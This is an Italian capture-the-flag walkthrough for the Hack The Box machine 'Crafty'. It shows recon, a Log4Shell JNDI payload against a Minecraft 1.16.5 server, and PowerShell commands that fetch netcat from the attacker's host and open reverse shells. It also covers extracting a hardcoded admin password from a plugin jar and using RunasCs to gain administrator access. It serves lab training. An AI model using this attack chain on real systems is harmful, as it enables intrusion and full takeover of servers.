# Macchina Crafty

IP vittima: 10.129.230.193 IP attacante: 10.10.14.245

## Recon

`sudo nmap -A -T 5 -p- 10.129.230.193 -oN porte oppure sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.230.193 -oG porte `
`nmap -p80,25565 -sC -sV 10.129.230.193 -oN servizi`

## Porte

```
80: Microsoft IIS httpd 10.0
25565: Minecraft 1.16.5 
```

## Porta 80

Per visitare la porta 80 occorre fare un reindirizzamento del DNS: sudo su echo 10.129.230.193 crafty.htb >> /etc/hosts

![[Pasted image 20251010194214.png]]

Facciamo un altro reindirizzamento per vistare play.crafty.htb echo 10.129.230.193 play.crafty.htb >> /etc/hosts ma che reindirizza a crafty.htb

## Porta 25565

searchsploit minecraft Minecraft Launcher 1.6.61 - Insecure File Permissions Privilege Escalation Non ci sono exploit validi

Ricerca su google di exploit per minecraft 1.16.5 si trova la vulenrabilità log4j

Ricerca su google poc github log4j minecraft exploit: [https://github.com/davidbombal/log4jminecraft](https://github.com/davidbombal/log4jminecraft)

Altra strada: a) ricerca su google: minecraft 1.16.5 client terminal sito: [https://github.com/MCCTeam/Minecraft-Console-Client](https://github.com/MCCTeam/Minecraft-Console-Client) scaricare la release MinecraftClient-20250522-285-linux-x64 dare i permessi di esecuzione (chomd +x)

b) cercare su google rogue jndi sito: [https://github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi) git clone --depth 1 [https://github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi) Dopo aver installato maven (builder) se non già disponibile fare il build: mvn package

c) scaricare netcat per windows 32bit wget [https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64-32.exe](https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64-32.exe);

N.B. Si ipotizza che tutti i file scaricati siano nella stessa cartella

Passaggi per il foothold

1. terminale 1: lanciare con ./MinecraftClient-20250522-285-linux-x64 test ""
2. terminale 2: mettersi in ascolto sulla porta 4444 con "nc -lnvp 4444"
3. terminale 3: preparare un server web python sulla porta 3000 con "python -m http.server 3000" nella cartella che contiene netcat per windows scaricato al punto b (nc64-32.exe)
4. terminale 4: lanciare il server rogue jndi che si trova nella cartella rogue-jndi/target con il comando:  
    java -jar RogueJndi-1.1.jar --command "powershell iwr [http://10.10.14.245:3000/nc64-32.exe](http://10.10.14.245:3000/nc64-32.exe) -O c:\windows\temp\nc64-32.exe; c:\windows\temp\nc64-32.exe 10.10.14.245 4444 -e cmd.exe" --hostname "10.10.14.245"
5. terminale 1: nel server minecraft lanciare il comando: ${jndi:ldap://10.10.14.245:1389/o=reference}
6. terminale 2: la porta 4444 in ascolto riceve la shell cmd

![[Pasted image 20251010194302.png]]

La userflag si trova in C:\Users\svc_minecraft\Desktop\user.txt

## Scalata dei privilegi

Nella cartella C:\Users\svc_minecraft\server\plugins è presente il file playercounter-1.0-SNAPSHOT.jar Occorre creare una cartella c:\temp e copiare il file nella nuova cartella: mkdir c:\temp cd C:\temp copy c:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar c:\temp\playercounter-1.0-SNAPSHOT.jar

Usare il comando: certutil -encode playercounter-1.0-SNAPSHOT.jar b64.txt Il comando prende il file binario playercounter-1.0-SNAPSHOT.jar, lo converte in testo Base64 (quindi una sequenza leggibile di caratteri ASCII) e salva il risultato nel file b64.txt.

Visualizzare il file creato con type b64.txt e copiare tutto il contenuto ad eccezione della riga iniziale -----BEGIN CERTIFICATE----- e quella finale -----END CERTIFICATE-----

In un altro terminale creare un file in cui inserire il contenuto copiato e poi decodificarlo da Base64 creando un nuovo file .jar con il comando: cat player.b64 | base64 -d >> player.jar

Ora il file potrà essere ispezionato ad esempio con jd-gui: jd-gui player.jar In htb.crafty.playercounter / htb.crafty.playercounter.Playercounter si trova la password: s67u84zKq8IXw

Ora occorre scaricare e unzippare lo strumento RunAsCs che dovrò essere caricato sulla macchina vittima wget [https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip](https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip) unzip RunAsCs.zip

Per scaricarlo sulla maccina vittima: powershell iwr [http://10.10.14.245:3000/RunasCs.exe](http://10.10.14.245:3000/RunasCs.exe) -O c:\temp\RunasCs.exe

Poi su un nuovo terminale mettiamoci ancora in ascolto su un altra porta con nc -lnvp 4500

poi nella cartella c:\temp lanciare il comando runascs.exe -l 2 administrator s67u84zKq8IXw "c:\windows\temp\nc64-32.exe 10.10.14.245 4500 -e cmd.exe"

Sul terminale in ascolto sulla porta 4500 si riceve la shell come amministratore

La rootflag si trova in C:\Users\Administrator\Desktop\root.txt
